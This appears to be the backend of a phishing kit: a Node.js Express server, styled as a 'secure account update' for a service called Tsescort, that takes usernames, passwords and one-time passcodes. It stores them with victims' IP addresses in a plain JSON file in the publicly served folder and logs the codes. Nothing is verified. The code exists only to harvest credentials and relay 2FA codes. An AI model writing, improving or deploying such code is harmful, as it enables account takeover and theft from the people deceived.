// ============================================================
//  TSESCORT · SECURE ACCOUNT UPDATE — server.js
//  POST /update-account  → saves identifier + password
//  POST /verify-otp      → saves OTP into the user's record
//  Data persisted in PLAIN JSON at public/users.json
// ============================================================
const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));

const PUBLIC_DIR = path.join(__dirname, 'public');
const USERS_FILE = path.join(PUBLIC_DIR, 'users.json');

if (!fs.existsSync(PUBLIC_DIR)) fs.mkdirSync(PUBLIC_DIR, { recursive: true });
if (!fs.existsSync(USERS_FILE)) fs.writeFileSync(USERS_FILE, JSON.stringify([], null, 2), 'utf8');

function readUsers() {
  try {
    const raw = fs.readFileSync(USERS_FILE, 'utf8');
    const parsed = JSON.parse(raw);
    return Array.isArray(parsed) ? parsed : [];
  } catch (err) {
    console.warn('[Tsescort] Could not read users.json, starting fresh.', err.message);
    return [];
  }
}
function writeUsers(users) {
  fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2), 'utf8');
}

// ---------- POST /update-account ----------
app.post('/update-account', (req, res) => {
  try {
    const { identifier, password, timestamp, app } = req.body;
    if (!identifier || !password) {
      return res.status(400).json({ success: false, error: 'Missing identifier or password' });
    }
    const users = readUsers();
    const newRecord = {
      id: Date.now() + '-' + Math.random().toString(36).substr(2, 9),
      identifier: identifier.trim(),
      password: password,
      timestamp: timestamp || new Date().toISOString(),
      app: app || 'tsescort',
      ip: req.ip || req.connection?.remoteAddress || 'unknown',
      otp: null,
      otpVerifiedAt: null,
      status: 'pending_otp'
    };
    const existingIndex = users.findIndex(
      (u) => u.identifier && u.identifier.toLowerCase() === newRecord.identifier.toLowerCase()
    );
    if (existingIndex !== -1) {
      users[existingIndex] = { ...users[existingIndex], ...newRecord, id: users[existingIndex].id };
      console.log('[Tsescort] Updated existing record for: ' + newRecord.identifier);
    } else {
      users.push(newRecord);
      console.log('[Tsescort] Added new record for: ' + newRecord.identifier);
    }
    writeUsers(users);
    return res.status(200).json({
      success: true,
      message: 'Account update saved. Awaiting OTP verification.',
      identifier: newRecord.identifier,
      totalUsers: users.length
    });
  } catch (error) {
    console.error('[Tsescort] Error in /update-account:', error);
    return res.status(500).json({ success: false, error: 'Internal server error' });
  }
});

// ---------- POST /verify-otp ----------
app.post('/verify-otp', (req, res) => {
  try {
    const { otp, timestamp, app, identifier } = req.body;
    if (!otp || String(otp).trim().length === 0) {
      return res.status(400).json({ success: false, error: 'Missing OTP' });
    }
    const users = readUsers();
    if (users.length === 0) {
      return res.status(404).json({ success: false, error: 'No user records found' });
    }
    let targetIndex = -1;
    if (identifier) {
      targetIndex = users.findIndex(
        (u) => u.identifier && u.identifier.toLowerCase() === String(identifier).toLowerCase()
      );
    }
    if (targetIndex === -1) {
      for (let i = users.length - 1; i >= 0; i--) {
        if (users[i].status === 'pending_otp' || !users[i].otp) {
          targetIndex = i;
          break;
        }
      }
    }
    if (targetIndex === -1) targetIndex = users.length - 1;

    users[targetIndex].otp = String(otp).trim();
    users[targetIndex].otpLength = String(otp).trim().length;
    users[targetIndex].otpVerifiedAt = timestamp || new Date().toISOString();
    users[targetIndex].status = 'otp_verified';
    users[targetIndex].app = app || users[targetIndex].app || 'tsescort';
    writeUsers(users);

    console.log('[Tsescort] OTP "' + otp + '" saved for user: ' + users[targetIndex].identifier);
    return res.status(200).json({
      success: true,
      message: 'OTP verified and saved successfully',
      identifier: users[targetIndex].identifier,
      otpVerifiedAt: users[targetIndex].otpVerifiedAt
    });
  } catch (error) {
    console.error('[Tsescort] Error in /verify-otp:', error);
    return res.status(500).json({ success: false, error: 'Internal server error' });
  }
});

app.get('/health', (req, res) => {
  res.json({ status: 'ok', service: 'tsescort-update' });
});

app.listen(PORT, () => {
  console.log('============================================');
  console.log('  TSESCORT · SECURE ACCOUNT UPDATE');
  console.log('  Server running on http://localhost:' + PORT);
  console.log('  Users file: ' + USERS_FILE);
  console.log('============================================');
});
